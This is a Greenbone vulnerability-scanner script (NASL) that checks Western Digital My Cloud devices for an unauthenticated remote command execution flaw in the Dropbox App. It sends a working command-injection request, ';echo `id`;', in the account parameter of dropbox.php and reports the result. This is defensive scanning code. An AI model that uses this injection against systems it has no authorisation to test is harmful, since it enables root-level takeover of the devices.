# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE_PREFIX = "cpe:/o:wdc";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108246");
  script_version("2025-06-25T05:41:02+0000");
  script_tag(name:"last_modification", value:"2025-06-25 05:41:02 +0000 (Wed, 25 Jun 2025)");
  script_tag(name:"creation_date", value:"2017-09-26 08:00:00 +0200 (Tue, 26 Sep 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Western Digital My Cloud Products Dropbox App RCE Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wd_mycloud_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wd-mycloud/http/detected");

  script_xref(name:"URL", value:"https://ssd-disclosure.com/ssd-advisory-remote-command-execution-in-western-digital-with-dropbox-app/");
  script_xref(name:"URL", value:"https://community.wd.com/t/new-release-my-cloud-dropbox-2-00-8-22-17/214582");

  script_tag(name:"summary", value:"The Dropbox App of Western Digital My Cloud products is prone to
  an unauthenticated remote command execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and check the response.");

  script_tag(name:"impact", value:"Successful exploit allows an attacker to execute arbitrary
  commands with root privileges in context of the affected application.");

  script_tag(name:"solution", value:"Update the Dropbox App to version 2.00 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, service:"www" ) )
  exit( 0 );

CPE = infos["cpe"];
if( ! CPE || ( "my_cloud" >!< CPE && "wd_cloud" >!< CPE ) )
  exit( 0 );

port = infos["port"];

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/Dropbox/php/dropbox.php?cmd=getBlacklist&account=;echo%20`id`;";

req = http_get_req( port:port, url:url,
                    accept_header:"application/xml, text/xml, */*; q=0.01",
                    add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( res =~ "^HTTP/1\.[01] 200" && res =~ "uid=[0-9]+.*gid=[0-9]+" ) {

  uid = eregmatch( pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:res );

  report  = 'By requesting the URL:\n\n';
  report += http_report_vuln_url( port:port, url:url, url_only:TRUE );
  report += '\n\nit was possible to execute the "id" command.';
  report += '\n\nResult: ' + uid[1];

  expert_info = 'Request:\n'+ req + 'Response:\n' + res;
  security_message( port:port, data:report, expert_info:expert_info );
  exit( 0 );
}

exit( 99 );
